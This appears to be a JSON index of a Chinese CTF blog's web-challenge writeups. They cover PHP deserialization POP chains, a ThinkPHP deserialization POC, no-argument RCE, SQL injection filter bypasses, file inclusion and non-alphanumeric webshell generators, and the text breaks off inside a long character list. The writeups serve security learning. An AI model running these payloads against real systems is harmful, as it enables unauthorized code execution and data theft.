[{"title":"2022陕西省赛","url":"/2023/06/24/2022%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/","content":"被加密的后门打开来是一个酷炫的页面\n\n然后扫描，有www.zip,fuck.php\n但是wp上的a.txt我没有扫到\n\n这里猜测是木马文件，还要有密码\n应该就是蚁剑链接的密码\nimport requestsimport timefrom tqdm import tqdmburp0_url = &quot;http://499b1259.clsadp.com/fuck.php&quot;import hashlib as mddictionary=str()with open(&quot;a.txt&quot;,&quot;r&quot;,encoding=&#x27;utf-8&#x27;) as e:    dictionary=e.readlines()for i in tqdm(range(len(dictionary))):    dictionary[i]=md.md5(dictionary[i].strip(&#x27;\\n&#x27;).encode(encoding=&#x27;utf-8&#x27;)).hexdigest()    burp0_data = &#123;&quot;&#123;0&#125;&quot;.format(dictionary[i]): &quot;system(&#x27;pwd&#x27;);&quot;&#125;    a=requests.post(burp0_url, data=burp0_data).text    if &#x27;www&#x27; in a:        print(dictionary[i])    else:        continue\n\n官方脚本，很慢\nspa&amp;col感觉前面真的很需要密码师傅\n扫出robots.txt\n\nbase92第一个\n\n下面是一个没见过的加密，直接在线\n\n\n这里才是web手该干的事情\n","categories":["writeups"],"tags":["信息收集","md5","fast_destruct","无参数rce","php反射类"]},{"title":"2023陕西省赛","url":"/2023/06/03/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/","content":"ezrce\n按key的按钮就出现了逻辑源码\n&lt;?phperror_reporting(0);include &#x27;waf.php&#x27;;header(&quot;Content-Type:text/html;charset=utf-8&quot;);echo &quot;你是谁啊哥们？把钥匙给我！！！！&lt;br/&gt;&quot;;$key=$_GET[&#x27;key&#x27;];$name=$_POST[&#x27;name&#x27;];$qaq=waf($_POST[&#x27;qaq&#x27;]);if (isset($_GET[&#x27;key&#x27;]))&#123;  highlight_file(__FILE__);&#125;if (isset($name))&#123;    echo &quot;你是&quot;.$name.&quot;大人????&lt;br/&gt;&quot;;    $name1=preg_replace(&#x27;/hahaha/e&#x27;,$qaq,$name);    echo &quot;骗我的吧，你明明是    &gt;&gt;&gt;&gt;小小&quot;.$name1;&#125;?&gt;\n\n&#x2F;e是当php代码执行\n\n\n看源代码就是会执行我们的$qaq，前面的name要被完全替换掉\n这里的key干什么不知道，但是我看了robots.txt没有什么东西\n尝试rce\nblacklist：全部数字，*，^,单双引号，/，`，.,\\，?, ,,-,~\n\n\n测不太出来\n但是我的思路是没有问题的\n因为\n\nphpinfo()成功了\n然后会一直被ban\n好像所有字符都没有用，后来想到可以用session做\n\n这样确实就用不到所有的字符，_和()都是之前测过可以用的。其实就是无参数rce的思想，之前也有学习过，核心点就是i利用没有参数的函数得flag\n这里就是记录一下session_id\nshow_souce把flag文件的内容展示了出来\nhttps://blog.csdn.net/weixin_46330722/article/details/110840156\nezpop &lt;?phphighlight_file(__FILE__);class night&#123;    public $night;    public function __destruct()&#123;        echo $this-&gt;night . &#x27;哒咩哟&#x27;;    &#125;&#125;class day&#123;    public $day;    public function __toString()&#123;        echo $this-&gt;day-&gt;go();    &#125;    public function __call($a, $b)&#123;        echo $this-&gt;day-&gt;getFlag();    &#125;&#125;class light&#123;    public $light;    public function __invoke()&#123;        echo $this-&gt;light-&gt;d();    &#125;&#125;class dark&#123;    public $dark;    public function go()&#123;        ($this-&gt;dark)();    &#125;    public function getFlag()&#123;        include(hacked($this-&gt;dark));    &#125;&#125;function hacked($s) &#123;    if(substr($s, 0,1) == &#x27;/&#x27;)&#123;        die(&#x27;呆jio步&#x27;);    &#125;    $s = preg_replace(&#x27;/\\.\\.*/&#x27;, &#x27;.&#x27;, $s);    $s = urldecode($s);    $s = htmlentities($s, ENT_QUOTES, &#x27;UTF-8&#x27;);    return strip_tags($s);&#125;$un = unserialize($_POST[&#x27;‮⁦快给我传参⁩⁦pop&#x27;]); // throw new Exception(&#x27;seino&#x27;); \n\n抓包就可以得到这段源码\npoc\n&lt;?phpclass night&#123;    public $night;&#125;class day&#123;    public $day;&#125;class light&#123;    public $light;&#125;class dark&#123;    public $dark;&#125;$flag = new night();$flag -&gt; night = new day();$flag -&gt; night -&gt; day = new dark();$flag -&gt; night -&gt; day -&gt; dark = new light();$flag -&gt; night -&gt; day -&gt; dark -&gt; light = new day();$flag -&gt; night -&gt; day -&gt; dark -&gt; light -&gt; day = new dark();$flag -&gt; night -&gt; day -&gt; dark -&gt; light -&gt; day -&gt; dark = &#x27;.%00%00./%00.%00%00./%00.%00%00./flag&#x27;;var_dump(urlencode(serialize($flag)));//&quot;O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&quot;//&quot;O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&quot;//&quot;O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&quot;$flag1=&#x27;O:5:&quot;night&quot;:2:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;;echo urlencode($flag1);\n\n最后的payload要进行破坏触发fast_destruct\nthrow new Exception(&#x27;seino&#x27;); \n\n两个原因\n1.反序列化的返回值被复制了，生命周期延长\n2.有异常处理，会死\n所以要破坏\n提前触发fast_destruct\n方法：\n\nhttps://www.anquanke.com/post/id/251366#h2-3\nunserialize有robots.txt\n\n有提示\n\n没见过\n回去看看\n &lt;?phphighlight_file(__FILE__);header(&quot;Content-type:text/html;charset=utf-8&quot;);require_once &quot;waf.php&quot;;error_reporting(0);class getFlag&#123;    private $password;    private $cmd;    public function __destruct()&#123;        if($this-&gt;password==&quot;‮⁦  //how to change the private variables⁩⁦secret&quot;)&#123;            system($this-&gt;cmd);        &#125;    &#125;&#125;$a = $_GET[&#x27;a&#x27;];if(isset($_GET[&#x27;a&#x27;]))&#123;    @eval(waf($a));&#125;?&gt;\n\n源码是这个，让我修改私有属性emmmm，结合一下hint\n查到了是用php反射类去做。\n注意源码这里又有不可见字符，这个比赛真的喜欢搞这个\n还有一个eval函数，这里我们必须利用她执行php代码，不然我们没有办法。官方的exp，其实也就是记住用反射类可以外部修改私有属性\nhttp://505f116c.clsadp.com/?a=$flag = new getFlag();$reflectionObject = new ReflectionObject($flag);$reflectionProperty = $reflectionObject-&gt;getProperty(&#x27;password&#x27;);$reflectionProperty-&gt;setAccessible(true);$reflectionProperty-&gt;setValue($flag, &quot;‮⁦  //how to change the private variables⁩⁦secret&quot;);$reflectionProperty = $reflectionObject-&gt;getProperty(&#x27;cmd&#x27;);$reflectionProperty-&gt;setAccessible(true);$reflectionProperty-&gt;setValue($flag, &#x27;cat /f*&#x27;);\n\n","categories":["writeups"],"tags":["fast_destruct","无参数rce","php反射类","rce","pop"]},{"title":"CISCN2022初赛","url":"/2023/05/08/CISCN2022%E5%88%9D%E8%B5%9B/","content":"[CISCN 2022 初赛]ezpop扫描出了www.zip\n然后有了thinkphp的框架目录\n然后题目告诉我们thinkphp的版本直接找网上的poc\nhttps://xz.aliyun.com/t/11584\n&lt;?php// 保证命名空间的一致namespace think &#123;    // Model需要是抽象类    abstract class Model &#123;        // 需要用到的关键字        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        // 初始化        public function __construct($obj=&#x27;&#x27;) &#123;            $this-&gt;lazySave = true;            $this-&gt;data = [&#x27;whoami&#x27;=&gt;[&#x27;whoami&#x27;]];//这里修改一下为 ls /*            $this-&gt;exists = true;            $this-&gt;table = $obj;    // 触发__toString            $this-&gt;withAttr = [&#x27;whoami&#x27;=&gt;[&#x27;system&#x27;]];            $this-&gt;json = [&#x27;whoami&#x27;];            $this-&gt;jsonAssoc = true;        &#125;    &#125;&#125;namespace think\\model &#123;    use think\\Model;    class Pivot extends Model &#123;    &#125;    // 实例化    $p = new Pivot(new Pivot());    echo urlencode(serialize($p));&#125;\n\n\n\n\n[CISCN 2022 华东南]web1无环境，写屁\n[CISCN 2022 华东南]xxcloud写不出\n罢了复现不了\n","categories":["writeups"],"tags":["thinkphp","反序列化"]},{"title":"HNCTF-2022-WEEk2","url":"/2023/05/18/HNCTF-2022-WEEk2/","content":"[HNCTF 2022 WEEK2]easy_include文件包含的基础梳理一下\n\n这里抄一张图：来自https://blog.csdn.net/qq_45300786/article/details/108724251\n为什么要有文件包含，其实这个是一个非常妙也是很正常的一个思想，为了代码不要去有那么多的冗余\n就用文件包含函数去包含，文件包含不在意后缀，只要是php代码，什么后缀都可以执行\n本地文件包含和远程文件包含\n这道题就是利用了本地文件包含\nnginx如果access.log可以访问，也就是过滤不全，被我们提权了，就可以在ua里面进行命令执行，因为返回的就是ua，所以就是在ua里面\n\n这里好像可以用一句话木马，但是我没有成功，是不明白为什么\n[HNCTF 2022 WEEK2]ez_SSTIfenjing\n\n[HNCTF 2022 WEEK2]ez_ssrf人家写的很好\nhttps://boogipop.com/2022/10/07/HNCTF%5Bez_ssrf%5D/![image-20230518215959113](HNCTF-2022-WEEk2/image-20230518215959113.png)\n[HNCTF 2022 WEEK2]Canyource无参数rce，之前也总结过\n其实核心思想就是利用无参数的函数不择手段的去完成rce，\n\npayload：http://node2.anna.nssctf.cn:28302/?code=readfile(next(array_reverse(scandir(current(localeconv())))));\n\nhttps://zhuanlan.zhihu.com/p/157431794\nhttps://www.cnblogs.com/upstream-yu/p/15062311.html\n[HNCTF 2022 WEEK2]easy_unser &lt;?php     include &#x27;f14g.php&#x27;;    error_reporting(0);    highlight_file(__FILE__);    class body&#123;    private $want,$todonothing = &quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;;    public function  __construct($want)&#123;        $About_me = &quot;When the object is created,I will be called&quot;;        if($want !== &quot; &quot;) $this-&gt;want = $want;        else $this-&gt;want = $this-&gt;todonothing;    &#125;    function __wakeup()&#123;        $About_me = &quot;When the object is unserialized,I will be called&quot;;        $but = &quot;I can CHANGE you&quot;;        $this-&gt; want = $but;        echo &quot;C1ybaby!&quot;;            &#125;    function __destruct()&#123;        $About_me = &quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;;        echo &quot;So,let me see if you can get what you want\\n&quot;;        if($this-&gt;todonothing === $this-&gt;want)            die(&quot;鲍勃,别傻愣着!\\n&quot;);        if($this-&gt;want == &quot;I can CHANGE you&quot;)            die(&quot;You are not you....&quot;);        if($this-&gt;want == &quot;f14g.php&quot; OR is_file($this-&gt;want))&#123;            die(&quot;You want my heart?No way!\\n&quot;);        &#125;else&#123;            echo &quot;You got it!&quot;;            highlight_file($this-&gt;want);            &#125;    &#125;&#125;    class unserializeorder&#123;        public $CORE = &quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;;        function __sleep()&#123;            $About_me = &quot;When the object is serialized,I will be called&quot;;            echo &quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;;        &#125;        function __toString()&#123;            $About_me = &quot;When the object is used as a string,I will be called&quot;;            return $this-&gt;CORE;        &#125;    &#125;        $obj = new unserializeorder();    echo $obj;    $obj = serialize($obj);        if (isset($_GET[&#x27;ywant&#x27;]))    &#123;        $ywant = @unserialize(@$_GET[&#x27;ywant&#x27;]);        echo $ywant;    &#125;?&gt;人类最大的敌人,就是无序. Yahi param vaastavikta hai!We Come To HNCTF,Enjoy the ser14l1zti0n\n\n反序列化\n进行分析审计\n\n里面其实也就是用到了\n&lt;?php//Tenclass body&#123;private $todonothing = &quot;test&quot;;private $want=&#x27;./test/../f14g.php&#x27;;&#125;$obj = new body();echo (urlencode(serialize($obj)));\n\n粘贴一个别人的exp\nfunction __destruct()&#123;       $About_me = &quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;;       echo &quot;So,let me see if you can get what you want\\n&quot;;       if($this-&gt;todonothing === $this-&gt;want)           die(&quot;鲍勃,别傻愣着!\\n&quot;);       if($this-&gt;want == &quot;I can CHANGE you&quot;)           die(&quot;You are not you....&quot;);       if($this-&gt;want == &quot;f14g.php&quot; OR is_file($this-&gt;want))&#123;           die(&quot;You want my heart?No way!\\n&quot;);       &#125;else&#123;           echo &quot;You got it!&quot;;           highlight_file($this-&gt;want);           &#125;   &#125;\n\n[HNCTF 2022 WEEK2]easy_sql\nsql注入的题，测试\n自测blacklist：空格，and，information_schema.tables ，table_schema \ninformation_schema.tables 可以用 mysql.innodb_table_stats 代替table_schema 可以用 database_name 代替\npayload\n数据库名1&#x27;/**/union/**/select/**/1,2,database()/**/where/**/&#x27;1//这个好像是错的查表名0&#x27;/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1查列名0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1这里用的是innodb引擎，就不要加限制条件，给啥都看查字符串0&#x27;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/&#x27;1\n\n\n\nhttps://wpscan.com/vulnerability/8acc0fc6-efe6-4662-b9ac-6342a7823328\n[HNCTF 2022 WEEK2]ohmywordpresshttps://blog.csdn.net/bossDDYY/article/details/127581507\n一个cve\n","categories":["writeups"],"tags":["反序列化","SQL注入","SSTI","ssrf","文件包含","CVE-2022-0760"]},{"title":"HNCTF 2022 week1 Writeup","url":"/2023/05/05/HNCTF2022Week1%E9%83%A8%E5%88%86wp/","content":"[HNCTF 2022 Week1]easy_html\n看看cookie\n\n\n有个框框，来我们猜猜是什么?xss ,ssti,sql?\n\n但是我发现这里好像只有10个位置，我的思路第一时间想到1到9999999999爆破。经过我的不断尝试，发现，我是呆逼\n手机号怎么可能只有10位呢。\n\n随便修改前端为超过10的数，然后输入10个以上的数就ok了\n亏得我电脑风扇还飞了起来\n\n[HNCTF 2022 Week1]Interesting_include\n读题就是过滤了大小写flag\n这种直接用过滤器，因为正则匹配都是匹配字符，而过滤器传递的是路径当攻击者使用php://filter/read=convert.base64-encode/resource=flag.php作为filter参数时，PHP解析器会将这个参数作为一个文件路径，传递给include函数。因为这个参数不是一个标准的文件路径，而是一个流过滤器，因此在执行include函数时，会先对这个参数进行处理，将flag.php文件的内容转换为base64编码，再输出到标准输出流中。\n\n[HNCTF 2022 Week1]easy_upload基础中的基础，直接改后缀名为php，蚁剑连接根目录一看就有了\n[HNCTF 2022 Week1]Interesting_http一开始叫我们post一个want\n按他说的做\n\n然后想要啥flag\n\n肯定没那么简单\n这种不是管理员一般看看cookie\n\n改改\n\nxff改改\n\n[HNCTF 2022 Week1]Challenge__rce\n传个hint试试\n\n一眼顶真\n\n无字符rce\n一直有接触但是没有系统学习，这里来一波。\n\n参考：https://xz.aliyun.com/t/8107\n\n最简单的无字符过滤\n&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;\n\n研究这段代码的绕过\n异或我们先从异或看起\n\n输出是’o’，我们来分析下原因,5的ASCII码是53,转成二进制是00110101,Z的ASCII码是90,转成二进制是01011010,将他们进行异或,为,也即十进制的111,为o\n\n再学习一下这段代码\n刚刚讲过’5’^’Z’为’o’\n这样我们就将$__赋值为’o’然后php允许把字符串当函数用。这样我们就成功的调用了o()这个函数\n$_是一个没有定义过的变量，php会给他赋一个默认值NULL&#x3D;&#x3D;0\n那么这个1就不难理解了\n\n取反\n先用python输出一个字符的utf8编码\n\n输出了一手rr，emmmm，为什么呢？\n\n还记得我们的python输出了什么吗\n\\xe5\\x8d\\xa2\n我们定义一个变量$_等于卢，里面有三个字节，取1就是第二个，\\x8d\n这样就可以得到一个ascii码字符\n总之我们就需要知道，对于一个汉字进行($x{0})或($x{1})或~($x{2})的操作，可以得到某个ASCII码的字符值\n一个版本问题PHP5中有一个函数是assert()，这是一个断言函数，用于测试阶段进行判断条件\n可以在php5里面这么用\n$_&#x3D;assert;\n$_()\n就是这么用，对这么用\n\n但是在php7及以上不行了。但是有别的方法\n\nPHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();\n\nphp中的短标签1.\n这个相当与&lt;?php&gt;\n2.\n这个相当&lt;?echo&gt;\n举个例子\n\n\n\nok的喔\n大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，这种写法总是适用的，这种写法则需要short_open_tag开启才行。\n所以还是需要注意一些版本问题\nphp中的反引号反引号可以当命令执行用知道吧，很常见的一个姿势\n&lt;?php$_=`whoami`;echo $_;\n\n\n结合上面的短标签就可以这么写\n\n效果是一样的\n好了前置知识结束，相信你和我一样觉得这些东西零零碎碎，没什么用接下来进入实操\n\n异或实操&lt;?php$shell = &quot;assert&quot;;$result1 = &quot;&quot;;$result2 = &quot;&quot;;for($num=0;$num&lt;=strlen($shell);$num++)&#123;    for($x=33;$x&lt;=126;$x++)    &#123;        if(judge(chr($x)))        &#123;            for($y=33;$y&lt;=126;$y++)            &#123;                if(judge(chr($y)))                &#123;                    $f = chr($x)^chr($y);                    if($f == $shell[$num])                    &#123;                        $result1 .= chr($x);                        $result2 .= chr($y);                        break 2;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;echo $result1;echo &quot;  &quot;;echo $result2;function judge($c)&#123;    if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$c))    &#123;        return true;    &#125;    return false;&#125;\n\n来理解理解吧\n还记的异或吗，我们需要得到一个可见函数，就是一个一个得到其中的字母或者数字，我们可以用循环异或非字母或者数字的方式的方式得到这个函数\n注意一个比较少用的语法，break 2，就是跳出两层循环\n\n取反实操&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);$shell = &quot;assert&quot;;$result = &quot;&quot;;$arr =array();$word = &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻